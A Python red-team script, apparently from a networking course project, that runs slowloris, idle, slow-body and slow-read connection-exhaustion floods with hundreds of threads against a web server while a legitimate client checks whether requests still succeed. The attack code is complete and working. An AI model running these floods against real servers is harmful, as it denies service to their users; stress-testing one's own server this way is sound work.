import socket
import sys
import threading
import time

from common import HOST, port_arg

'''
    Red team: connection-exhaustion attacks, with a well-behaved client running alongside

    Author: Giselle Wu, Dartmouth CS60, Fall 2026
            Assisted by Claude (Anthropic): wrote the attack scripts

    run: python3 redteam/floods.py <server_port> [mode] [connections] [seconds]
         mode is slowloris, idle, slowbody, slowread, or all (default)
    e.g. python3 redteam/floods.py 8080 slowloris 600

    Each attacker thread holds a connection open as long as the server allows, then
    reconnects immediately. Meanwhile a legit client requests helloworld.html every
    0.2 s. The attack "lands" if the legit client gets anything other than 200.
    Raise your open-file limit first so the attacker itself doesn't run out: ulimit -n 8192
'''

SLOWLORIS = b"GET /helloworld.html HTTP/1.1\r\nHost: x\r\nX-a: " + b"b" * 1000 #never ends

def attacker(port, mode, stop):
    while time.time() < stop:
        s = None
        try:
            s = socket.create_connection((HOST, port))
            s.settimeout(1)
            if mode == "slowloris": #one header byte every 0.5 s, never the blank line
                for b in SLOWLORIS:
                    s.send(bytes([b]))
                    time.sleep(0.5)
                    if time.time() > stop:
                        break
            elif mode == "idle": #connect and say nothing
                time.sleep(stop - time.time())
            elif mode == "slowbody": #promise 1000 bytes of body, send one every 0.5 s
                s.sendall(b"GET /helloworld.html HTTP/1.1\r\nHost: x\r\nContent-Length: 1000\r\n\r\n")
                for _ in range(1000):
                    s.send(b"a")
                    time.sleep(0.5)
            elif mode == "slowread": #ask for the big file 50 times and never read it
                s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1024)
                s.sendall(b"GET /english_words.txt HTTP/1.1\r\nHost: x\r\n\r\n" * 50)
                time.sleep(stop - time.time())
        except OSError: #the server dropped us; reconnect
            time.sleep(0.05)
        finally:
            if s:
                s.close()

def legit_request(port):
    s = socket.create_connection((HOST, port), timeout=5)
    s.sendall(b"GET /helloworld.html HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n")
    out = b""
    while True:
        d = s.recv(4096)
        if not d:
            break
        out += d
    s.close()
    return out[9:12].decode() or "no response"

def flood(port, mode, n, seconds):
    stop = time.time() + seconds
    for _ in range(n):
        threading.Thread(target=attacker, args=(port, mode, stop), daemon=True).start()
    time.sleep(2) #let the attack ramp up before measuring

    results, worst = {}, 0.0
    while time.time() < stop:
        start = time.time()
        try:
            code = legit_request(port)
        except OSError as e:
            code = type(e).__name__
        worst = max(worst, time.time() - start)
        results[code] = results.get(code, 0) + 1
        time.sleep(0.2)

    total = sum(results.values())
    ok = results.get("200", 0)
    print(f"{'PASS' if ok == total else 'FAIL'}  {mode:<9} x{n}: legit client got 200 on {ok}/{total} "
          f"{results}  worst latency {worst:.2f}s")
    return ok == total

if __name__ == "__main__":
    port = port_arg()
    mode = sys.argv[2] if len(sys.argv) > 2 else "all"
    n = int(sys.argv[3]) if len(sys.argv) > 3 else None
    seconds = int(sys.argv[4]) if len(sys.argv) > 4 else 20
    plan = {"slowloris": 600, "idle": 600, "slowbody": 300, "slowread": 50}
    modes = list(plan) if mode == "all" else [mode]
    failed = 0
    for i, m in enumerate(modes):
        failed += not flood(port, m, n or plan[m], seconds)
        if i < len(modes) - 1:
            time.sleep(7) #let the server shed the previous attack's connections
    sys.exit(1 if failed else 0)
